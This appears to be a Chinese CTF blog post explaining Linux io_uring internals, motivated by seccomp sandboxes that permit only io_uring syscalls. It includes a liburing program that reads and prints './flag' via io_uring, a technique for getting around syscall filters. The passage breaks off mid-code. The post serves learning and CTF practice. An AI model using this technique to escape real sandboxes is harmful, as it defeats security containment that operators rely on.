<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="browsermode" content="application">
<meta name="apple-touch-fullscreen" content="yes">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="V3rdant's Blog">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="msapplication-navbutton-color" content="#666666">
<meta name= "format-detection" content="telephone=no" />




  <meta name="keywords" content="pwn" />


  <meta name="keywords" content="linux, io_uring, shellcode, nlvi" />


<link rel="apple-touch-startup-image" media="(device-width: 375px)" href="assets/apple-launch-1125x2436.png">
<link rel="apple-touch-startup-image" media="(orientation: landscape)" href="assets/apple-touch-startup-image-2048x1496.png">

<link rel="stylesheet" href="/style/style.css">

<script>
  var nlviconfig = {
    title: "V3rdant's Blog",
    author: "V3rdant",
    baseUrl: "/",
    theme: {
      scheme: "banderole",
      lightbox: true,
      animate: true,
      search: true,
      friends: false,
      reward: false,
      pjax: false,
      lazy: false,
      toc: true
    }
  }
</script>




    
<link rel="stylesheet" href="/script/lib/lightbox/css/lightbox.min.css">





    
<link rel="stylesheet" href="/syuanpi/syuanpi.min.css">
















<style>
@font-face {
  font-family: "Allura";
  src: url('/font/allura/allura.ttf');
}
</style>

  <title> Linux.io_uring-Top-down-Approch · V3rdant's Blog </title>
<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="V3rdant's Blog" type="application/atom+xml">
</head>
<body>
  <div class="container">
    <header class="header" id="header">
  <div class="header-wrapper">
    <div class="logo">
  <div class="logo-inner syuanpi tvIn" style="display:none;">
    <h1><a href="/">V3rdant's Blog</a></h1>
    
  </div>
</div>

    <nav class="main-nav">
  
  <ul class="main-nav-list syuanpi tvIn">
  
    <li class="menu-item">
      <a href="javascript:;" id="search-btn" aria-label="Search">
        <i class="iconfont icon-search"></i>
      </a>
    </li>
  
  
  
    
  
    <li class="menu-item">
      <a href="/" id="article">
        <span class="base-name">
          
            ARTICLE
          
        </span>
      </a>
    </li>
  
  
    
  
    <li class="menu-item">
      <a href="/archives" id="archives">
        <span class="base-name">
          
            ARCHIVES
          
        </span>
      </a>
    </li>
  
  
    
  
    <li class="menu-item">
      <a href="javascript:;" id="tags">
        <span class="base-name">
          
            TAGS
          
        </span>
      </a>
    </li>
  
  
    
  
    <li class="menu-item">
      <a href="/about" id="about">
        <span class="base-name">
          
            ABOUT
          
        </span>
      </a>
    </li>
  
  
  </ul>
  
</nav>

  </div>
</header>
<div class="mobile-header" id="mobile-header">
  <div class="mobile-header-nav">
    <div class="mobile-header-item" id="mobile-left">
      <div class="header-menu-item">
        <div class="header-menu-line"></div>
      </div>
    </div>
    <h1 class="mobile-header-title">
      <a href="/">V3rdant's Blog</a>
    </h1>
    <div class="mobile-header-item"></div>
  </div>
  <div class="mobile-header-body">
    <ul class="mobile-header-list">
      
        <li class="mobile-nav-item syuanpi fadeInRightShort back-0">
          <a href="/" >
            
              ARTICLE
            
          </a>
        </li>
      
        <li class="mobile-nav-item syuanpi fadeInRightShort back-1">
          <a href="/archives" >
            
              ARCHIVES
            
          </a>
        </li>
      
        <li class="mobile-nav-item syuanpi fadeInRightShort back-2">
          <a href="javascript:;" id="mobile-tags">
            
              TAGS
            
          </a>
        </li>
      
        <li class="mobile-nav-item syuanpi fadeInRightShort back-3">
          <a href="/about" >
            
              ABOUT
            
          </a>
        </li>
      
    </ul>
  </div>
</div>



    <div class="container-inner" style="display:none;">
      <main class="main" id="main">
        <div class="main-wrapper">
          
    
  
  <article class="
  post
   is_post 
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInRightShort back-1">
        <div class="post-time-wrapper">
          
          <time>2023-12-04</time>
          
            
              <span class="post-category"><a href="/categories/CTF/">CTF</a></span>
            
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInRightShort back-2">
        
          Linux.io_uring-Top-down-Approch
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInRightShort back-3">
      
        <p>最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 <code>io_uring_setup</code> 一个系统调用，之前不久的ACTF中， 使用<code>mmap</code>、<code>io_uring_setup</code>、<code>io_uring_enter</code> 三个系统调用，完成了orw。 如何仅仅使用 <code>io_uring_setup</code> 完成orw呢？</p>
<p>本文将不仅仅局限于CTF，而是从io_uring的实现出发，先从宏观角度透视io_uring的实现框架， 然后以源代码为基础，自顶向下，从liburing，io_uring的用户态接口， 最后到io_uring的内核实现，一步步聚焦 <code>io_uring</code>  具体的实现。</p>
<p>由于笔者为安全方向，因此笔者将更多关注 io_uring 中用户和内核态的通信这一容易产生安全漏洞的模块，而不会聚焦io_uring的异步调度和任务处理，以上。</p>
<h2 id="overview">overview</h2>
<p>在开始前，首先介绍一下什么是<a target="_blank" rel="noopener" href="https://man.archlinux.org/man/io_uring.7.en">io_uring</a> 。</p>
<p>io_uring 是 Linux 5.1 引入的一套新的异步 I/O 接口机制,主要有以下特点:</p>
<ol>
<li>高效 - 通过共享内存和锁自由的接口设计大大降低了系统调用开销。</li>
<li>灵活 - 支持阻塞,非阻塞,轮询多种调用方式,可以同时提交多个 I/O 请求并通过轮询或异步方式得到完成通知。</li>
<li>通用 - 支持文件,网络,时间,引用计数等多种 I/O,统一了异步 I/O 接口。</li>
</ol>
<p>io_uring 主要由提交队列(SQ)、完成队列(CQ)、SQEs 请求和 CQEs 结果组成。</p>
<p>其中SQE和CQE 分别是SQ和CQ中的一个实体。</p>
<p>应用通过mmap映射SQ和CQ,向SQ提交I/O请求,再通过读CQ获取I/O完成结果。这避免了大量的 context switch 和系统调用开销。</p>
<p>这里以ACTF星盟的师傅写的liburing实现orw的一个小例子来介绍一下io_uring 的工作原理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref from https://blog.xmcve.com/2023/10/31/ACTF-2023-Writeup/#title-9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUEUE_DEPTH 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span></span><br><span class="line">    <span class="type">int</span> fd, ret;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">4096</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_queue_init&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备打开操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dirfd = AT_FDCWD;  <span class="comment">// 当前工作目录的文件描述符</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line">    <span class="type">int</span> flags = O_RDONLY;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_openat(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Open error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = cqe-&gt;res;  <span class="comment">// 获取打开的文件描述符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备读取操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_read(sqe, fd, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Read error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备写操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_write(sqe, <span class="number">1</span>, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Read error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;Read %d bytes: %s\n&quot;, cqe-&gt;res, buffer);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理并关闭文件</span></span><br><span class="line">    io_uring_cqe_seen(&amp;ring, cqe);</span><br><span class="line">    io_uring_queue_exit(&amp;ring);</span><br><span class="line">    close(fd);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，如果要使用io_uring会经历如下流程：</p>
<p>首先通过 <code>io_uring_queue_init</code> 完成了初始化，io_uring的sq和cq队列也被创建</p>
<p>在库内部实际上是使用 <code>io_uring_setup</code> 和 <code>mmap</code> 两个syscall实现</p>
<p>前者完成了内核中相应结构体和资源的创建，后者将两个队列映射到用户态内存，通过共享内存方便用户态访问</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;io_uring_queue_init&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后，用户使用 <code>io_uring_get_sqe</code> 得到一个sqe，(SQ队列中的一个实体) ，并根据所要完成的任务，设置sqe的各个成员， 这个过程是完全在用户态完成的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line"><span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dirfd = AT_FDCWD;  <span class="comment">// 当前工作目录的文件描述符</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">int</span> flags = O_RDONLY;</span><br><span class="line"></span><br><span class="line">io_uring_prep_openat(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>最后，通过 <code>io_uring_submit</code> 提交了请求，库内部实际上是调用了 <code>io_uring_enter</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = io_uring_submit(&amp;ring);</span><br></pre></td></tr></table></figure>
<h3 id="io-uring任务收割模式">io_uring任务收割模式</h3>
<p>这里主要解释一下 <code>IORING_SETUP_SQPOLL</code> 和 <code>IORING_SETUP_IOPOLL</code> 的区别</p>
<blockquote>
<p>IORING_SETUP_SQPOLL<br>
When this flag is specified, a kernel thread is created to<br>
perform submission queue polling.  An io_uring instance<br>
configured in this way enables an application to issue I/O<br>
without ever context switching into the kernel.  By using<br>
the submission queue to fill in new submission queue<br>
entries and watching for completions on the completion<br>
queue, the application can submit and reap I/Os without<br>
doing a single system call.<br>
If the kernel thread is idle for more than sq_thread_idle<br>
milliseconds, it will set the IORING_SQ_NEED_WAKEUP bit in<br>
the flags field of the struct io_sq_ring.  When this<br>
happens, the application must call io_uring_enter(2) to<br>
wake the kernel thread.  If I/O is kept busy, the kernel<br>
thread will never sleep.  An application making use of<br>
this feature will need to guard the io_uring_enter(2) call<br>
with the following code sequence:<br>
/*<br>
* Ensure that the wakeup flag is read after the tail pointer<br>
* has been written. It’s important to use memory load acquire<br>
* semantics for the flags read, as otherwise the application<br>
* and the kernel might not agree on the consistency of the<br>
* wakeup flag.<br>
*/<br>
unsigned flags = atomic_load_relaxed(sq_ring-&gt;flags);<br>
if (flags &amp; IORING_SQ_NEED_WAKEUP)<br>
io_uring_enter(fd, 0, 0, IORING_ENTER_SQ_WAKEUP);</p>
</blockquote>
<blockquote>
<p>IORING_SETUP_IOPOLL<br>
Perform busy-waiting for an I/O completion, as opposed to<br>
getting notifications via an asynchronous IRQ (Interrupt<br>
Request).  The file system (if any) and block device must<br>
support polling in order for this to work.  Busy-waiting<br>
provides lower latency, but may consume more CPU resources<br>
than interrupt driven I/O.  Currently, this feature is<br>
usable only on a file descriptor opened using the O_DIRECT<br>
flag.  When a read or write is submitted to a polled<br>
context, the application must poll for completions on the<br>
CQ ring by calling io_uring_enter(2).  It is illegal to<br>
mix and match polled and non-polled I/O on an io_uring<br>
instance.<br>
This is only applicable for storage devices for now, and<br>
the storage device must be configured for polling. How to<br>
do that depends on the device type in question. For NVMe<br>
devices, the nvme driver must be loaded with the<br>
poll_queues parameter set to the desired number of polling<br>
queues. The polling queues will be shared appropriately<br>
between the CPUs in the system, if the number is less than<br>
the number of online CPU threads.</p>
</blockquote>
<p>即，SQPOLL 通过内核线程定时唤醒来收割任务<br>
IOPOLL 通过 <code>io_uring_enter</code> 通知内核来收割任务</p>
<h3 id="struct">struct</h3>
<p>其次，需要在讲解前，介绍一下 liburing 和 内核暴露出的一些结构体：</p>
<h4 id="liburing">liburing</h4>
<p>首先是 <code>io_uring</code> 这是liburing 关于io_uring的核心管理结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> <span class="title">sq</span>;</span> <span class="comment">// sq 管理结构体</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cq</span> <span class="title">cq</span>;</span> <span class="comment">// cq 管理结构体</span></span><br><span class="line">	<span class="type">unsigned</span> flags;        <span class="comment">// setup时的flag设置</span></span><br><span class="line">	<span class="comment">// 以下setup返回时写入params的一些信息</span></span><br><span class="line">	<span class="type">int</span> ring_fd;           </span><br><span class="line">	<span class="type">unsigned</span> features;   </span><br><span class="line">	<span class="type">int</span> enter_ring_fd;</span><br><span class="line">	__u8 int_flags;</span><br><span class="line">	__u8 pad[<span class="number">3</span>];</span><br><span class="line">	<span class="type">unsigned</span> pad2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>io_uring_sq</code>， sq的管理结构体， 这个结构体在6.5及以下的版本可以在内核中找到，在6.5以上的版本在内核中删除了，6.5以上存在io_rings，相当于io_uring_sq和io_uring_cq 的组合</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> *khead;</span><br><span class="line">	<span class="type">unsigned</span> *ktail;</span><br><span class="line">	<span class="comment">// Deprecated: use `ring_mask` instead of `*kring_mask`</span></span><br><span class="line">	<span class="type">unsigned</span> *kring_mask;</span><br><span class="line">	<span class="comment">// Deprecated: use `ring_entries` instead of `*kring_entries`</span></span><br><span class="line">	<span class="type">unsigned</span> *kring_entries;</span><br><span class="line">	<span class="type">unsigned</span> *kflags;</span><br><span class="line">	<span class="type">unsigned</span> *kdropped;</span><br><span class="line">	<span class="type">unsigned</span> *<span class="built_in">array</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqes</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> sqe_head;</span><br><span class="line">	<span class="type">unsigned</span> sqe_tail;</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> ring_sz;</span><br><span class="line">	<span class="type">void</span> *ring_ptr;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> ring_mask;</span><br><span class="line">	<span class="type">unsigned</span> ring_entries;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> pad[<span class="number">2</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在此着重解释一下ring_ptr和 sqes两个成员：<br>
这两个成员，在没有设置NO_MMAP的情况下，都是由 <code>io_uring_setup</code> 后用mmap映射得到的。</p>
<p>ring_prt指向一连串内核用来处理io_uring时的信息，例如当前循环队列head和tail， <code>io_uring_setup</code> 返回时会设置 <code>io_uring_params</code> 中的 sq_off 结构，这个结构就记录了各个成员信息，相对于ring_ptr的偏移， 最后在 [[#io_uring_setup_ring_pointers]] 中设置相关变量指向和内核共享的内存区域中对应的偏移。</p>
<p>而sqes，就是真正的共享队列的区域</p>
<p>类似的，存在io_uring_cq 结构体</p>
<h4 id="kernel">kernel</h4>
<p>首先是<code>io_uring_params</code></p>
<p>他是<code>io_uring_setup</code> 传入的参数，同时，返回时，kernel会给此结构体相应成员赋值.</p>
<p>此结构体也是提供给用户态的API</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> &#123;</span></span><br><span class="line">	__u32 sq_entries;</span><br><span class="line">	__u32 cq_entries;</span><br><span class="line">	__u32 flags;</span><br><span class="line">	__u32 sq_thread_cpu;   <span class="comment">// 内核任务处理线程占用的cpu</span></span><br><span class="line">	__u32 sq_thread_idle;  <span class="comment">// 内核任务处理线程最大闲置时间，</span></span><br><span class="line">						   <span class="comment">// 见`IORING_SETUP_SQPOLL`</span></span><br><span class="line">	__u32 features;</span><br><span class="line">	__u32 wq_fd;</span><br><span class="line">	__u32 resv[<span class="number">3</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_sqring_offsets</span> <span class="title">sq_off</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_cqring_offsets</span> <span class="title">cq_off</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 